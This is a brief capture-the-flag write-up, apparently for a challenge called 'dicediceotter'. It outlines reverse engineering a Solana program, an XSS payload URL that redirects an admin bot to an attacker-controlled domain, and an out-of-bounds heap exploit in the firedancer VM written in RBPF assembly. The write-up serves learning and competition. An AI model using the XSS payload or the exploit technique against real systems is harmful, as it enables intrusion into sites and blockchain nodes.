# dicediceotter

1. Reverse engineering the Solana program: The cheat code for the game is a 12-byte sequence starting with [1, 7, 7, 6], and the product of the 12 integers is 430,040,725,982,322.
2. Trigger the XSS bug by setting the innerHTML with a controlled `winner.name`. Use the following payload: https://ddg.mc.ax/?code=AQcHBg1lnbXFxwEB;<style onload=location="//shortdomain">. Now we can redirect the admin bot to a controlled site.
3. Exploit the OOB bug in firedancer. The bug stems from a misconfiguration of the heap size in the Solana VM. We can write RBPF assembly to gain direct memory access beyond the virtual heap, which resides on the current thread's stack.
